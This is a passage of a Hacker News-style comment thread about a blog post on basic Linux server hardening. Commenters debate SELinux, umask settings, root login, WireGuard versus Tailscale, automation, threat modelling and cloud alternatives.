cult about enabling SE Linux, restricting access with IP tables, configuring AuditD and AIDE.<p>These are great ways to massively overcomplicate your system. Generally speaking, having encountered these tools, do not use them unless you&#x27;re willing to dedicate about 2x the time you would otherwise spend administering the system.</div><br/><div id="36937820" class="c"><input type="checkbox" id="c-36937820" checked=""/><div class="controls bullet"><span class="by">jdhendrickson</span><span>|</span><a href="#36934509">root</a><span>|</span><a href="#36935956">parent</a><span>|</span><a href="#36938910">next</a><span>|</span><label class="collapse" for="c-36937820">[-]</label><label class="expand" for="c-36937820">[1 more]</label></div><br/><div class="children"><div class="content">Just because you had difficulty does not mean you should give such advice to others. There is nothing difficult about configuring any of these systems if you know what you are doing.</div><br/></div></div></div></div><div id="36938910" class="c"><input type="checkbox" id="c-36938910" checked=""/><div class="controls bullet"><span class="by">walth</span><span>|</span><a href="#36934509">root</a><span>|</span><a href="#36935123">parent</a><span>|</span><a href="#36935956">prev</a><span>|</span><a href="#36934594">next</a><span>|</span><label class="collapse" for="c-36938910">[-]</label><label class="expand" for="c-36938910">[1 more]</label></div><br/><div class="children"><div class="content">I&#x27;m still not sure on how disabling the crypto algorithms that the NSA prefers to not break helps us stay more secure...</div><br/></div></div></div></div></div></div></div></div><div id="36934594" class="c"><input type="checkbox" id="c-36934594" checked=""/><div class="controls bullet"><span class="by">wnevets</span><span>|</span><a href="#36934509">parent</a><span>|</span><a href="#36934787">prev</a><span>|</span><a href="#36934624">next</a><span>|</span><label class="collapse" for="c-36934594">[-]</label><label class="expand" for="c-36934594">[1 more]</label></div><br/><div class="children"><div class="content">The second sentence<p>&gt; But I write software for the web<p>I&#x27;m going to guess it&#x27;s a web server but it&#x27;s just a guess.</div><br/></div></div><div id="36934624" class="c"><input type="checkbox" id="c-36934624" checked=""/><div class="controls bullet"><span class="by">j45</span><span>|</span><a href="#36934509">parent</a><span>|</span><a href="#36934594">prev</a><span>|</span><a href="#36934612">next</a><span>|</span><label class="collapse" for="c-36934624">[-]</label><label class="expand" for="c-36934624">[2 more]</label></div><br/><div class="children"><div class="content">2nd and 3rd sentence<p>“ But I write software for the web, which means I’m never far from a server, and sometimes I’m the only one around.<p>So even if I didn’t want the job, I have it, and I need to take the security of these hosts seriously.”<p>Basic Linux server hardening is not a bad idea or skill to learn. Learning the basics manually help feed into understanding and using higher level solutions.</div><br/><div id="36935148" class="c"><input type="checkbox" id="c-36935148" checked=""/><div class="controls bullet"><span class="by">linuxdude314</span><span>|</span><a href="#36934509">root</a><span>|</span><a href="#36934624">parent</a><span>|</span><a href="#36934612">next</a><span>|</span><label class="collapse" for="c-36935148">[-]</label><label class="expand" for="c-36935148">[1 more]</label></div><br/><div class="children"><div class="content">100%<p>As long as you are using Debian, RHEL, Ubuntu, or CentOS implementing a basic minimum security baseline is as simple as following the CIS or DISA STIG guides for your OS.<p>There are plenty of scripts on GitHub that do this (AUDIT THEM FIRST), or you can even just use premade images from CIS in the cloud provider of your choice.</div><br/></div></div></div></div><div id="36934612" class="c"><input type="checkbox" id="c-36934612" checked=""/><div class="controls bullet"><span class="by">jauntywundrkind</span><span>|</span><a href="#36934509">parent</a><span>|</span><a href="#36934624">prev</a><span>|</span><a href="#36937949">next</a><span>|</span><label class="collapse" for="c-36934612">[-]</label><label class="expand" for="c-36934612">[5 more]</label></div><br/><div class="children"><div class="content">Almost every server sits on the internet and has one or two (sometimes a couple more) ports open listening for their apps internet traffic.<p>What the traffic is seems irrelevant to 99.99% of servers out there, imo. Yes there&#x27;s some questions of what deployments look like and what capabilities operators have but those are details outside the general concern of being safely online. IMO.</div><br/><div id="36938964" class="c"><input type="checkbox" id="c-36938964" checked=""/><div class="controls bullet"><span class="by">AdieuToLogic</span><span>|</span><a href="#36934509">root</a><span>|</span><a href="#36934612">parent</a><span>|</span><a href="#36937456">next</a><span>|</span><label class="collapse" for="c-36938964">[-]</label><label class="expand" for="c-36938964">[1 more]</label></div><br/><div class="children"><div class="content">&gt; Almost every server sits on the internet ...<p>Nope.  Not by a long shot.<p>&gt; What the traffic is seems irrelevant to 99.99% of servers out there, imo. Yes there&#x27;s some questions of what deployments look like and what capabilities operators have but those are details outside the general concern of being safely online. IMO.<p>The following vulnerabilities listing just for the week of 2023-07-17 prove otherwise:<p><a href="https:&#x2F;&#x2F;www.cisa.gov&#x2F;news-events&#x2F;bulletins&#x2F;sb23-205" rel="nofollow noreferrer">https:&#x2F;&#x2F;www.cisa.gov&#x2F;news-events&#x2F;bulletins&#x2F;sb23-205</a></div><br/></div></div><div id="36937456" class="c"><input type="checkbox" id="c-36937456" checked=""/><div class="controls bullet"><span class="by">jeffbee</span><span>|</span><a href="#36934509">root</a><span>|</span><a href="#36934612">parent</a><span>|</span><a href="#36938964">prev</a><span>|</span><a href="#36937949">next</a><span>|</span><label class="collapse" for="c-36937456">[-]</label><label class="expand" for="c-36937456">[3 more]</label></div><br/><div class="children"><div class="content">&gt; Almost every server sits on the internet<p>I&#x27;m going to counter that the overwhelming majority of hosts in existence do not, in fact, &quot;sit on the internet&quot;.</div><br/><div id="36937536" class="c"><input type="checkbox" id="c-36937536" checked=""/><div class="controls bullet"><span class="by">indigodaddy</span><span>|</span><a href="#36934509">root</a><span>|</span><a href="#36937456">parent</a><span>|</span><a href="#36937573">next</a><span>|</span><label class="collapse" for="c-36937536">[-]</label><label class="expand" for="c-36937536">[1 more]</label></div><br/><div class="children"><div class="content">Ideally the traffic would be siphoned thru a load balancer&#x2F;reverse proxy of some kind rather than the dest service endpoint&#x2F;port being directly exposed to the internet</div><br/></div></div><div id="36937573" class="c"><input type="checkbox" id="c-36937573" checked=""/><div class="controls bullet"><span class="by">jauntywundrkind</span><span>|</span><a href="#36934509">root</a><span>|</span><a href="#36937456">parent</a><span>|</span><a href="#36937536">prev</a><span>|</span><a href="#36937949">next</a><span>|</span><label class="collapse" for="c-36937573">[-]</label><label class="expand" for="c-36937573">[1 more]</label></div><br/><div class="children"><div class="content">Sure. But everyone else here was talking about servers. Which, you know,... serve. Are in some way on the internet.</div><br/></div></div></div></div></div></div></div></div><div id="36937949" class="c"><input type="checkbox" id="c-36937949" checked=""/><div class="controls bullet"><span class="by">ufmace</span><span>|</span><a href="#36934509">prev</a><span>|</span><a href="#36934868">next</a><span>|</span><label class="collapse" for="c-36937949">[-]</label><label class="expand" for="c-36937949">[3 more]</label></div><br/><div class="children"><div class="content">I actually disagree with most of this. I think that, for servers, it&#x27;s best to stay as close to the &quot;cattle, not pets&quot; model as reasonably possible. Servers should be set up and maintained with automated tooling and rarely connected to manually, preferably only to debug issues. Most of the things in here are gimmicky one-offs that don&#x27;t meaningfully increase security.<p>Don&#x27;t bother setting up a user account, use a public key authorized SSH session as root to do everything. Setting up UFW to block everything but what you should be serving is good. I don&#x27;t see much point in things like Wireguard or this umask thing.</div><br/><div id="36939349" class="c"><input type="checkbox" id="c-36939349" checked=""/><div class="controls bullet"><span class="by">thaumiel</span><span>|</span><a href="#36937949">parent</a><span>|</span><a href="#36934868">next</a><span>|</span><label class="collapse" for="c-36939349">[-]</label><label class="expand" for="c-36939349">[2 more]</label></div><br/><div class="children"><div class="content">What should one do when that is not possible to handle the servers as cattle, because there is 200 unique servers which different people has to connect to and do different things with, like a university or other academic places?</div><br/><div id="36940155" class="c"><input type="checkbox" id="c-36940155" checked=""/><div class="controls bullet"><span class="by">awestroke</span><span>|</span><a href="#36937949">root</a><span>|</span><a href="#36939349">parent</a><span>|</span><a href="#36934868">next</a><span>|</span><label class="collapse" for="c-36940155">[-]</label><label class="expand" for="c-36940155">[1 more]</label></div><br/><div class="children"><div class="content">Hire sysadmins</div><br/></div></div></div></div></div></div><div id="36934868" class="c"><input type="checkbox" id="c-36934868" checked=""/><div class="controls bullet"><span class="by">politelemon</span><span>|</span><a href="#36937949">prev</a><span>|</span><a href="#36937313">next</a><span>|</span><label class="collapse" for="c-36934868">[-]</label><label class="expand" for="c-36934868">[3 more]</label></div><br/><div class="children"><div class="content">&gt; If you’re on Windows, PuTTYgen should work<p>If you&#x27;re on Windows you can `wsl --install` and work with Linux (eg Ubuntu 2204).<p>You can also install Git Bash which comes with ssh and ssh-keygen.<p>Either way , same instructions.</div><br/><div id="36935003" class="c"><input type="checkbox" id="c-36935003" checked=""/><div class="controls bullet"><span class="by">cjcampbell</span><span>|</span><a href="#36934868">parent</a><span>|</span><a href="#36937313">next</a><span>|</span><label class="collapse" for="c-36935003">[-]</label><label class="expand" for="c-36935003">[2 more]</label></div><br/><div class="children"><div class="content">And on up-to-date versions, OpenSSH client and tools are available from powershell or cmd.</div><br/><div id="36935337" class="c"><input type="checkbox" id="c-36935337" checked=""/><div class="controls bullet"><span class="by">pxc</span><span>|</span><a href="#36934868">root</a><span>|</span><a href="#36935003">parent</a><span>|</span><a href="#36937313">next</a><span>|</span><label class="collapse" for="c-36935337">[-]</label><label class="expand" for="c-36935337">[1 more]</label></div><br/><div class="children"><div class="content">You can also install the Microsoft port of OpenSSH on older versions yourself.</div><br/></div></div></div></div></div></div><div id="36937313" class="c"><input type="checkbox" id="c-36937313" checked=""/><div class="controls bullet"><span class="by">teekert</span><span>|</span><a href="#36934868">prev</a><span>|</span><a href="#36939193">next</a><span>|</span><label class="collapse" for="c-36937313">[-]</label><label class="expand" for="c-36937313">[2 more]</label></div><br/><div class="children"><div class="content">I’m a biologist and also a reluctant sysadmin. I’m happy to see I do roughly the same [0] except that I use an ed25519 ssh key and switched to Tailscale (it’s just too easy). I only open “unsafe” ports on the tailnet.<p>I did just install my first NixOS system so I’m indeed heading towards full automation.<p>[0] <a href="https:&#x2F;&#x2F;blog.hmrt.nl&#x2F;posts&#x2F;first_steps_arch_box&#x2F;" rel="nofollow noreferrer">https:&#x2F;&#x2F;blog.hmrt.nl&#x2F;posts&#x2F;first_steps_arch_box&#x2F;</a></div><br/><div id="36937661" class="c"><input type="checkbox" id="c-36937661" checked=""/><div class="controls bullet"><span class="by">nunez</span><span>|</span><a href="#36937313">parent</a><span>|</span><a href="#36939193">next</a><span>|</span><label class="collapse" for="c-36937661">[-]</label><label class="expand" for="c-36937661">[1 more]</label></div><br/><div class="children"><div class="content">Tailscale is so good. One of the best pieces of software I&#x27;ve used in a long time. It just works, and it&#x27;s really good at what it does (VPNs into your private network, regardless of the route to it)</div><br/></div></div></div></div><div id="36938733" class="c"><input type="checkbox" id="c-36938733" checked=""/><div class="controls bullet"><span class="by">pid-1</span><span>|</span><a href="#36939193">prev</a><span>|</span><a href="#36936046">next</a><span>|</span><label class="collapse" for="c-36938733">[-]</label><label class="expand" for="c-36938733">[1 more]</label></div><br/><div class="children"><div class="content">Sysadmin isn&#x27;t a profession you choose, it&#x27;s something that happens to your life.</div><br/></div></div><div id="36936046" class="c"><input type="checkbox" id="c-36936046" checked=""/><div class="controls bullet"><span class="by">DyslexicAtheist</span><span>|</span><a href="#36938733">prev</a><span>|</span><a href="#36939512">next</a><span>|</span><label class="collapse" for="c-36936046">[-]</label><label class="expand" for="c-36936046">[2 more]</label></div><br/><div class="children"><div class="content">securing from what? this thing is pointless mid-90ies advise without a threat-model.</div><br/><div id="36936328" class="c"><input type="checkbox" id="c-36936328" checked=""/><div class="controls bullet"><span class="by">thewanderer1983</span><span>|</span><a href="#36936046">parent</a><span>|</span><a href="#36939512">next</a><span>|</span><label class="collapse" for="c-36936328">[-]</label><label class="expand" for="c-36936328">[1 more]</label></div><br/><div class="children"><div class="content">This guy gets it. Your first question should be around your threat model. Are you protecting against random scans and script kiddies or the various APTs?<p>Maybe then look at the MITRE ATT&amp;CK framework, Cyber Kill Chain etc.<p>I really hate to suggest them as it appears they have deviated in weirds ways from their original goal of protecting critical infrastructure from cybersecurity attacks, but CISA has many relevant documents.</div><br/></div></div></div></div><div id="36939512" class="c"><input type="checkbox" id="c-36939512" checked=""/><div class="controls bullet"><span class="by">r3n</span><span>|</span><a href="#36936046">prev</a><span>|</span><a href="#36936952">next</a><span>|</span><label class="collapse" for="c-36939512">[-]</label><label class="expand" for="c-36939512">[1 more]</label></div><br/><div class="children"><div class="content">Is there a guide to teach these reluctant sysadmins how to evaluate, plan, and choose between all these different methods ?<p>For me, I find the hardest part of securing systems are usually to decide what is good enough for the current situation.</div><br/></div></div><div id="36936952" class="c"><input type="checkbox" id="c-36936952" checked=""/><div class="controls bullet"><span class="by">thr0waway001</span><span>|</span><a href="#36939512">prev</a><span>|</span><a href="#36939381">next</a><span>|</span><label class="collapse" for="c-36936952">[-]</label><label class="expand" for="c-36936952">[1 more]</label></div><br/><div class="children"><div class="content">Reluctant sysadmin: story of my life.<p>Over the last 3 years I have gone from being a timid junior web dev to reluctantly and hastily having to be the guy managing the Linux web servers and keeping the operation running and being hardened along the way.<p>On the one hand, the huge salary increase has been nice but on the other hand I am constantly thinking one day I&#x27;m gonna fuck it all up. I feel like I&#x27;m not doing this job any justice and that I&#x27;m way out of my element all the time.<p>I try to get better by reading blog posts like this and documentation and asking for advice but I just feel like an impostor all the time.<p>But employers are happy with the results and I guess that makes it tolerable.<p>So thanks for these types of guides!</div><br/></div></div><div id="36939381" class="c"><input type="checkbox" id="c-36939381" checked=""/><div class="controls bullet"><span class="by">kbar13</span><span>|</span><a href="#36936952">prev</a><span>|</span><a href="#36939896">next</a><span>|</span><label class="collapse" for="c-36939381">[-]</label><label class="expand" for="c-36939381">[1 more]</label></div><br/><div class="children"><div class="content">trying my best to understand the target audience for this blog post. It feels like most of these things fall somewhere in between &quot;a sysadmin should know this&quot; and &quot;this might be new to a dev without much ops experience&quot;. And then, my first thought is, well if you&#x27;re focused on getting software out the door your best bet is not to touch any of this stuff and deploy on a platform where configuring the Linux distro is not your responsibility. i.e. k8s or AWS ECS</div><br/></div></div><div id="36939896" class="c"><input type="checkbox" id="c-36939896" checked=""/><div class="controls bullet"><span class="by">optimalsolver</span><span>|</span><a href="#36939381">prev</a><span>|</span><a href="#36935183">next</a><span>|</span><label class="collapse" for="c-36939896">[-]</label><label class="expand" for="c-36939896">[1 more]</label></div><br/><div class="children"><div class="content">No Fail2ban?</div><br/></div></div><div id="36935183" class="c"><input type="checkbox" id="c-36935183" checked=""/><div class="controls bullet"><span class="by">Sparkyte</span><span>|</span><a href="#36939896">prev</a><span>|</span><a href="#36937134">next</a><span>|</span><label class="collapse" for="c-36935183">[-]</label><label class="expand" for="c-36935183">[1 more]</label></div><br/><div class="children"><div class="content">Meh, just do it like me get hardened image and container. Deploy stuff as a gold image without elevated permissions and or container. Then just make sure everything is behind a proxy or intelligent load balancer that restricts any crazy input.<p>DONT OVERCOMPLICATE WORK<p>Overcomplicating work means slower response times to solving problems.</div><br/></div></div><div id="36937816" class="c"><input type="checkbox" id="c-36937816" checked=""/><div class="controls bullet"><span class="by">nunez</span><span>|</span><a href="#36937134">prev</a><span>|</span><a href="#36938431">next</a><span>|</span><label class="collapse" for="c-36937816">[-]</label><label class="expand" for="c-36937816">[1 more]</label></div><br/><div class="children"><div class="content">WireGuard is fine, but since it&#x27;s only UDP, it doesn&#x27;t work well if you&#x27;re connecting behind a restrictive firewall or from a network using CGNAT (many of them).<p>If you&#x27;re a reluctant sysadmin that doesn&#x27;t care, I&#x27;d recommend using Tailscale. It&#x27;s wireguard without the drama, is extremely competent at piercing through almost any firewall [0], and has a great ACL system that lets you fine tune which accounts can access what.<p>It&#x27;s also free (for now)!<p>[0] <a href="https:&#x2F;&#x2F;tailscale.com&#x2F;blog&#x2F;how-nat-traversal-works&#x2F;" rel="nofollow noreferrer">https:&#x2F;&#x2F;tailscale.com&#x2F;blog&#x2F;how-nat-traversal-works&#x2F;</a></div><br/></div></div><div id="36938431" class="c"><input type="checkbox" id="c-36938431" checked=""/><div class="controls bullet"><span class="by">_el</span><span>|</span><a href="#36937816">prev</a><span>|</span><a href="#36934555">next</a><span>|</span><label class="collapse" for="c-36938431">[-]</label><label class="expand" for="c-36938431">[1 more]</label></div><br/><div class="children"><div class="content">It&#x27;s definitely neat to know how these things work on a Linux server, but most of this advice doesn&#x27;t make sense for an EC2 instance. You should be using security groups instead of UFW (indeed the article mentions this). You don&#x27;t need to configure SSH access because SSM session manager exists, which also makes the WireGuard setup superfluous, too.</div><br/></div></div><div id="36934555" class="c"><input type="checkbox" id="c-36934555" checked=""/><div class="controls bullet"><span class="by">mmsc</span><span>|</span><a href="#36938431">prev</a><span>|</span><a href="#36936845">next</a><span>|</span><label class="collapse" for="c-36934555">[-]</label><label class="expand" for="c-36934555">[6 more]</label></div><br/><div class="children"><div class="content">I like the changing of the default umask, although it probably shouldn&#x27;t be 077.<p>Is acl needed over, say, chown?</div><br/><div id="36934979" class="c"><input type="checkbox" id="c-36934979" checked=""/><div class="controls bullet"><span class="by">aesh2Xa1</span><span>|</span><a href="#36934555">parent</a><span>|</span><a href="#36934744">next</a><span>|</span><label class="collapse" for="c-36934979">[-]</label><label class="expand" for="c-36934979">[1 more]</label></div><br/><div class="children"><div class="content">No, there&#x27;s no need to use `setfacl` over `chown&#x2F;chmod` in the author&#x27;s example.<p>The reason that the author uses umask 077 and ACLs is, I think, just a mindset. By using 077, the file is restricted to only the owner, and the sysadmin does not need to think about group memberships. By extending read access using an ACL, this theme is continued; additional usernames will be appended as ACLs, but no group set of usernames needs to exist.<p>A file named &quot;alfred&quot; would, presumably, only ever needed to be read by root and alfred, but that&#x27;s just the narrow case for the author&#x27;s scheme.</div><br/></div></div><div id="36934744" class="c"><input type="checkbox" id="c-36934744" checked=""/><div class="controls bullet"><span class="by">cutler</span><span>|</span><a href="#36934555">parent</a><span>|</span><a href="#36934979">prev</a><span>|</span><a href="#36934740">next</a><span>|</span><label class="collapse" for="c-36934744">[-]</label><label class="expand" for="c-36934744">[2 more]</label></div><br/><div class="children"><div class="content">If not 077 then what?</div><br/><div id="36935068" class="c"><input type="checkbox" id="c-36935068" checked=""/><div class="controls bullet"><span class="by">linuxdude314</span><span>|</span><a href="#36934555">root</a><span>|</span><a href="#36934744">parent</a><span>|</span><a href="#36934740">next</a><span>|</span><label class="collapse" for="c-36935068">[-]</label><label class="expand" for="c-36935068">[1 more]</label></div><br/><div class="children"><div class="content">077 is a bit too restrictive for a lot of workloads.  027 is recommended by CIS for servers and 022 for desktop.<p>If you are sure you can use 077 without stuff breaking, awesome, but that&#x27;s not always the case. Typically on systems using 077 you will find yourself using chmod a lot.</div><br/></div></div></div></div><div id="36934740" class="c"><input type="checkbox" id="c-36934740" checked=""/><div class="controls bullet"><span class="by">chris_st</span><span>|</span><a href="#36934555">parent</a><span>|</span><a href="#36934744">prev</a><span>|</span><a href="#36936845">next</a><span>|</span><label class="collapse" for="c-36934740">[-]</label><label class="expand" for="c-36934740">[2 more]</label></div><br/><div class="children"><div class="content">Why not 077?</div><br/></div></div></div></div><div id="36936845" class="c"><input type="checkbox" id="c-36936845" checked=""/><div class="controls bullet"><span class="by">jesprenj</span><span>|</span><a href="#36934555">prev</a><span>|</span><a href="#36939170">next</a><span>|</span><label class="collapse" for="c-36936845">[-]</label><label class="expand" for="c-36936845">[2 more]</label></div><br/><div class="children"><div class="content">&gt; You should not log in directly as root.<p>Why not?</div><br/><div id="36938332" class="c"><input type="checkbox" id="c-36938332" checked=""/><div class="controls bullet"><span class="by">kccqzy</span><span>|</span><a href="#36936845">parent</a><span>|</span><a href="#36939170">next</a><span>|</span><label class="collapse" for="c-36938332">[-]</label><label class="expand" for="c-36938332">[1 more]</label></div><br/><div class="children"><div class="content">I see this as mostly a way to prevent fat finger mistakes on the part of the sysadmin. Most of the tasks that need to be done when interactively logging in don&#x27;t really require root per se. Why give yourself so much ambient permissions then? If I accidentally issue a command that only root can execute, it is a chance to reflect when repeating the command with sudo and typing the password.</div><br/></div></div></div></div><div id="36939170" class="c"><input type="checkbox" id="c-36939170" checked=""/><div class="controls bullet"><span class="by">badrabbit</span><span>|</span><a href="#36936845">prev</a><span>|</span><a href="#36935773">next</a><span>|</span><label class="collapse" for="c-36939170">[-]</label><label class="expand" for="c-36939170">[1 more]</label></div><br/><div class="children"><div class="content">Run lynis and linpeas!!!<p>Also, setup auditd and rsyslog forwarding. Backup anything important.</div><br/></div></div><div id="36935773" class="c"><input type="checkbox" id="c-36935773" checked=""/><div class="controls bullet"><span class="by">andai</span><span>|</span><a href="#36939170">prev</a><span>|</span><a href="#36936409">next</a><span>|</span><label class="collapse" for="c-36935773">[-]</label><label class="expand" for="c-36935773">[3 more]</label></div><br/><div class="children"><div class="content">Wouldn&#x27;t it be easier to use OpenBSD?</div><br/><div id="36939064" class="c"><input type="checkbox" id="c-36939064" checked=""/><div class="controls bullet"><span class="by">cookiengineer</span><span>|</span><a href="#36935773">parent</a><span>|</span><a href="#36935850">next</a><span>|</span><label class="collapse" for="c-36939064">[-]</label><label class="expand" for="c-36939064">[1 more]</label></div><br/><div class="children"><div class="content">OpenBSD don&#x27;t even have security advisories like most other distros have. [1]<p>So I&#x27;d argue it&#x27;s impossible to build a correct threat model if all your vulnerabilities are expressed on code-level, rather than on &quot;what software&quot; or &quot;what packages&quot; are affected by it.<p>[1] <a href="https:&#x2F;&#x2F;www.openbsd.org&#x2F;errata73.html" rel="nofollow noreferrer">https:&#x2F;&#x2F;www.openbsd.org&#x2F;errata73.html</a></div><br/></div></div><div id="36935850" class="c"><input type="checkbox" id="c-36935850" checked=""/><div class="controls bullet"><span class="by">rs_rs_rs_rs_rs</span><span>|</span><a href="#36935773">parent</a><span>|</span><a href="#36939064">prev</a><span>|</span><a href="#36936409">next</a><span>|</span><label class="collapse" for="c-36935850">[-]</label><label class="expand" for="c-36935850">[1 more]</label></div><br/><div class="children"><div class="content">Nice try.</div><br/></div></div></div></div></div></div></div></div></div></body></html>